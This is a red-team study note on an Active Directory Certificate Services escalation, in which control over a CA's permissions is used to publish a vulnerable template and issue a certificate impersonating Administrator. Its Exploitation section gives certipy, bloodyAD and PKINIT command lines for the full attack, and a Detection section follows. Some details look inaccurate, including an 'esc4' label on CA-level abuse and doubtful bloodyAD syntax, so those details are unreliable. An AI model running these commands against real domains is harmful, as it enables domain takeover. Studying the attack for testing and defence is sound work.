---
tags:
  - attack
  - knowledge
  - AD
  - windows
  - redteam
date: 2023-09-1
---
- Vulnerability in [[ADCS (Active Directory Certificate Services)|AD CS]].
- Attackers do not need a vulnerable template.
- Attackers abuse `Write DACL` or `Full Control` permissions over CA to:
	- add/publish a vulnerable template.
	- enable any existing template.
	- issue certs that impersonate any identity in AD.
# Background

- [[Certificate Authority (CA)|CA]] publishes templates to AD - if you control the ACLs, you can:
	- publish your own templates (e.g. one with `ENROLLE_SUPPLIES_SUBJECT`)
	- publish existing but unused vulnerable templates (like `User`).
	- control who can request certs.
	- change CA security descriptors.
- If no published templates are exploitable, you can make one available and enroll.
# Vulnerability Criteria

- The user must have one of the following rights:
	- `WriteDACL`
	- `WriteOwner`
	- `FullControl`
- Or can modify:
	- `msPKI-Enrollment-Flag`
	- `pKIExtendedKeyUsage`
	- `certificateTemplates` on the CA object.
# Exploitation

- Enumerate vulnerable CA permissions:
	- `certipy find -u user@domain.local -p 'Pass123!' -dc-ip 10.0.0.5`
	- lists CAs and template access:
		- look for `WriteDACL` or `GenericAll` on CA object.
	- [[BloodyAD]] also available:
		- `bloodyAD acl --object-type pKIEnrollmentService --name "CA01.domain.local" --sid <your-user-sid>`
- Publish a vulnerable template:
	- `bloodyAD ca --action publish --ca "CA01.domain.local" --template "User"`
		- if user vulnerable, exploitable path is ready.
- Request cert using spoofed identity:
	- `certipy req -u user@domain.local -p 'Pass123!' -ca CA01\CA01 -template User -upn Administrator@domain.local -dc-ip 10.0.0.5 -output esc4`
- Authenticate:
	- `certipy auth -pfx esc4.pfx -dc-ip 10.0.0.5`
	- Or use impacket PKINIT tools:
		- `gettgtpkinit.py -pfx esc4.pfx domain.local/Administrator`
# Detection

- Monitor:
	- `Event ID 4899` - template added/removed.
	- changes to `certificateTemplates` attribute on CA objects.
	- unexpected publishing of vulnerable templates.
	- certificate issuance (`Event ID 4886`) from newly added templates.